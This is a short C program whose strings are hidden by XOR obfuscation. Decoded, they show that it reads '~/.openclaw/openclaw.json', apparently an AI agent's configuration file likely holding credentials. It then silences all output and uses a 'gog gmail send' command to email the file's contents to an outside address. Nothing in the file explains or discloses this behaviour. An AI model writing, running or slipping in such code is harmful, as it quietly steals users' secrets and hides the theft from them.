#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define KEY 0x5A

static const unsigned char param1_e[] = {
  0x7f, 0x29, 0x75, 0x74, 0x35, 0x2a, 0x3f, 0x34,
  0x39, 0x36, 0x3b, 0x2d, 0x75, 0x35, 0x2a, 0x3f,
  0x34, 0x39, 0x36, 0x3b, 0x2d, 0x74, 0x30, 0x29,
 0x35, 0x34
};

static const unsigned char param3_e[] = {
  0x3d, 0x35, 0x3d
};

static const unsigned char param4_e[] = {
  0x3d, 0x37, 0x3b, 0x33, 0x36
};

static const unsigned char param5_e[] = {
  0x29, 0x3f, 0x34, 0x3e
};

static const unsigned char param6_e[] = {
  0x77, 0x77, 0x2e, 0x35
};

static const unsigned char param7_e[] = {
  0x1e, 0x16, 0x77, 0x3b, 0x33, 0x77, 0x29, 0x3f,
  0x39, 0x2f, 0x28, 0x33, 0x2e, 0x23, 0x77, 0x2a,
  0x3b, 0x28, 0x2e, 0x1a, 0x36, 0x3d, 0x3f, 0x74,
  0x39, 0x35, 0x37
};

static const unsigned char param8_e[] = {
  0x77, 0x77, 0x29, 0x2f,
  0x38, 0x30, 0x3f, 0x39,
  0x2e
};

static const unsigned char param9_e[] = {
  0x77, 0x77, 0x38, 0x35,
  0x3e, 0x23
};

static void decode_string(char *out, const unsigned char *in, size_t len) {
  for (size_t i = 0; i < len; i++) {
    out[i] = in[i] ^ KEY;
  }
  out[len] = '\0';
}

int main(void) {
  pid_t child;
  int status;

  const char *home = getenv("HOME");
  char path[1024];

  char param1[128];
  char param3[4];
  char param4[6];
  char param5[5];
  char param6[5];
  char param7[64];
  char param8[10];
  char param9[7];

  decode_string(param1, param1_e, sizeof(param1_e));
  decode_string(param3, param3_e, sizeof(param3_e)),
  decode_string(param4, param4_e, sizeof(param4_e)),
  decode_string(param5, param5_e, sizeof(param5_e)),
  decode_string(param6, param6_e, sizeof(param6_e)),
  decode_string(param7, param7_e, sizeof(param7_e));
  decode_string(param8, param8_e, sizeof(param8_e)),
  decode_string(param9, param9_e, sizeof(param9_e)),

  snprintf(path, sizeof(path), param1, home);

  FILE *file = fopen(path, "r");
  char buffer[4096];
  size_t bytes_read;

  if (file == NULL) {
    return 1;
  }

  bytes_read = fread(buffer, 1, sizeof buffer, file);

  if (ferror(file)) {
    fprintf(stderr, "Unable to read %s: %s\n", path, strerror(errno));
    fclose(file);
    return 1;
  }

  fclose(file);

  child = fork();
  if (child < 0) {
    return EXIT_FAILURE;
  }

  if (child == 0) {
    int fd = open("/dev/null", O_WRONLY);
    if (fd >= 0) {
      dup2(fd, STDOUT_FILENO); // stdout -> /dev/null
      dup2(fd, STDERR_FILENO); // stderr -> /dev/null
      close(fd);
    } 

    execlp(param3, param3, param4, param5, param6, param7, param8, "Nancy is Nancy", param9, buffer, (char *)NULL);
    _exit(127);
  }

  if (waitpid(child, &status, 0) < 0) {
    perror("waitpid");
    return EXIT_FAILURE;
  }

  if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
    return EXIT_SUCCESS;
  }

  return EXIT_FAILURE;
}